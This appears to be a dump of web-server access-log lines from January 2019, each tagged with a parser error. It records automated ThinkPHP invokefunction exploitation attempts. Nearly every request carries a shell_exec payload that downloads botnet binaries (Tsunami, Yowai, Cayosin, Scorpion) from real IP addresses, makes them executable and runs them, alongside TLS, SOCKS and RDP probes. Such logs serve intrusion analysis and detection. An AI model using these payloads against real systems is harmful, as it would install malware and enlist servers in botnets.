('220.246.209.65 - - [25/Jan/2019:03:10:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('112.234.7.215 - - [25/Jan/2019:03:13:49 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('117.198.103.116 - - [25/Jan/2019:03:19:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('42.118.10.161 - - [25/Jan/2019:03:20:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('61.86.79.193 - - [25/Jan/2019:03:37:44 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('149.202.169.246 - - [25/Jan/2019:05:47:45 +0330] "\\x15\\x03\\x01\\x00\\x02\\x02P" 400 166 "-" "-" "-"\n', 'list index out of range')
('149.202.169.246 - - [25/Jan/2019:05:47:46 +0330] "\\x15\\x03\\x01\\x00\\x02\\x02P" 400 166 "-" "-" "-"\n', 'list index out of range')
('124.140.76.80 - - [25/Jan/2019:06:13:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('222.138.138.64 - - [25/Jan/2019:06:29:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('72.52.87.60 - - [25/Jan/2019:07:14:40 +0330] "\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03 \\x84\\xDD9\\xF2\\xBA\\x911\\xEAL\\xC1c\\xC8\\xB15\\xAB\\xC7\\x8F\\x19/0\\xB9\\x05\\xA3~\\x93\\xF3!\\xEC\\x12\\xEAv \\x9F\\xE2\\xAE\\xE7\\xDF\\x83\\x12\'\\xF1\\xE5\\x10\\xBD\\xA1\\xECg\\x1D\\xDC\\xBF\\xA0)\\xC8\\xAA\\xE0\\xB1-\\xFE\\x12\\xCBO\\x03\\xCA-\\x00*\\xCC\\x14\\xCC\\x13\\xCC\\x15\\xC0/\\xC0+\\x00\\x9E\\xC0\\x14\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('72.52.87.60 - - [25/Jan/2019:07:16:55 +0330] "\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03\\x94\\x12\\xAD?%\\xB8\\x15!\\x9B\\xB7\\xED*4SV\\x18\\xE1\\xEF\\xF3+\\x9E\\xE0\\xF8\\x13\\x14\\xA6e" 400 166 "-" "-" "-"\n', 'list index out of range')
('43.230.197.4 - - [25/Jan/2019:07:46:03 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('126.58.237.63 - - [25/Jan/2019:08:04:00 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('116.90.206.18 - - [25/Jan/2019:08:54:09 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('103.2.64.231 - - [25/Jan/2019:08:59:44 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.188.210.12 - - [25/Jan/2019:09:10:31 +0330] "\\x05\\x01\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('5.188.210.12 - - [25/Jan/2019:09:12:12 +0330] "\\x04\\x01\\x00P\\x05\\xBC\\xD2\\x0C\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('89.215.238.65 - - [25/Jan/2019:09:35:47 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('112.137.114.117 - - [25/Jan/2019:09:42:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('202.214.186.65 - - [25/Jan/2019:10:32:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('144.132.10.218 - - [25/Jan/2019:11:27:44 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('82.47.156.228 - - [25/Jan/2019:12:27:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('82.47.156.228 - - [25/Jan/2019:12:27:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('185.53.88.19 - - [25/Jan/2019:13:48:00 +0330] "\\x16\\x03\\x01\\x00b\\x01\\x00\\x00^\\x03\\x01\\x5CJ\\xE3*\\x84Gv\\xBD\\xFA\\xA8}\\xA3\\xB8\\xB0\\xA8\\xDD\\x080\\x16\\xBD(O\\xB81r\\xDDU\\xA85" 400 166 "-" "-" "-"\n', 'list index out of range')
('185.53.88.19 - - [25/Jan/2019:13:48:00 +0330] "\\x16\\x03\\x01\\x00b\\x01\\x00\\x00^\\x03\\x01\\x5CJ\\xE3*H\\x80o\\x90\\xBE\\xB5\\xF2\\xB8j\\xF6\\xFEV\\xE2A\\xDB\\xCD\\x19\\xBE\\xB73\\xDA\\x81\\xFC\\xA7+,\\xAD\\xC5\\x00\\x00\\x18\\xC0\\x14\\xC0\\x13\\x005\\x00/\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('1.215.205.157 - - [25/Jan/2019:13:52:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('42.119.194.186 - - [25/Jan/2019:13:54:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('126.58.237.63 - - [25/Jan/2019:14:04:33 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('43.230.197.4 - - [25/Jan/2019:14:53:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('162.244.81.232 - - [25/Jan/2019:15:08:10 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('42.117.207.158 - - [25/Jan/2019:15:08:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('91.148.174.153 - - [25/Jan/2019:15:56:04 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('176.175.104.231 - - [25/Jan/2019:16:03:37 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('64.68.245.69 - - [25/Jan/2019:16:35:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('185.244.25.243 - - [25/Jan/2019:17:27:25 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('162.244.81.232 - - [25/Jan/2019:18:33:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('61.121.238.84 - - [25/Jan/2019:18:44:45 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('180.46.119.157 - - [25/Jan/2019:18:59:05 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.2.224.146 - - [25/Jan/2019:19:25:21 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('189.134.81.243 - - [25/Jan/2019:19:44:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('85.96.175.63 - - [25/Jan/2019:19:49:40 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('194.113.106.126 - - [25/Jan/2019:20:33:38 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('85.99.114.34 - - [25/Jan/2019:20:50:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('115.59.27.99 - - [25/Jan/2019:21:53:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('1.215.205.157 - - [25/Jan/2019:22:43:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('112.80.208.59 - - [25/Jan/2019:23:41:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('162.244.80.47 - - [25/Jan/2019:23:44:47 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('111.176.101.195 - - [25/Jan/2019:23:51:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('185.105.4.172 - - [26/Jan/2019:00:18:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('185.209.0.12 - - [26/Jan/2019:00:28:34 +0330] "\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr" 400 166 "-" "-" "-"\n', 'list index out of range')
('61.86.79.193 - - [26/Jan/2019:00:36:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('153.145.147.89 - - [26/Jan/2019:00:51:05 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('64.71.174.85 - - [26/Jan/2019:01:25:01 +0330] "\\x17\\x03\\x03\\x02f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0F\\xC4\\xBA\\xFF\\xBC\\x05\\xFC\\xDD7*f*cS\\x82\\xA8\\x10#\'\\xAA\\xE1I>\\xF6n\\xA7^_\\xD8r\\x94\'\\xFFB\\xDC\\xE1\\xAA\\x10\\x02\\x10\\xF3\\xAAX\\xB1T\\x0Cm\\xABH\\xBA\\xA5\\x1Bb\\x8E\\xB6G\\x22\\x85f\\x00%\\x0F\\xA9eZ\\xAAi\\xB2t\\xF0\\x14#\\x8AH)3\\xE2?^\\xD6\\x1FaL\\x98\\xE3\\x93\\xAB\\xC3\\x89\\xBF" 400 166 "-" "-" "-"\n', 'list index out of range')
('31.163.44.102 - - [26/Jan/2019:01:54:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('37.29.32.137 - - [26/Jan/2019:02:05:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.118.10.161 - - [26/Jan/2019:02:20:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.188.218.203 - - [26/Jan/2019:02:27:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('89.46.222.181 - - [26/Jan/2019:02:51:32 +0330] "GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp" 400 166 "-" "-" "-"\n', 'list index out of range')
('85.197.162.91 - - [26/Jan/2019:03:29:33 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('92.56.8.28 - - [26/Jan/2019:03:30:29 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('162.244.80.47 - - [26/Jan/2019:03:31:11 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('42.118.10.161 - - [26/Jan/2019:04:11:00 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('61.86.79.193 - - [26/Jan/2019:04:23:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('36.89.106.19 - - [26/Jan/2019:05:06:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('213.41.230.66 - - [26/Jan/2019:05:53:47 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('121.84.86.234 - - [26/Jan/2019:06:53:02 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.141.84.60 - - [26/Jan/2019:06:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('185.105.4.172 - - [26/Jan/2019:07:29:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('185.244.25.243 - - [26/Jan/2019:07:38:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('126.58.237.63 - - [26/Jan/2019:08:35:02 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('203.177.173.46 - - [26/Jan/2019:09:28:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('80.252.153.95 - - [26/Jan/2019:09:49:23 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('162.244.81.232 - - [26/Jan/2019:10:49:47 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
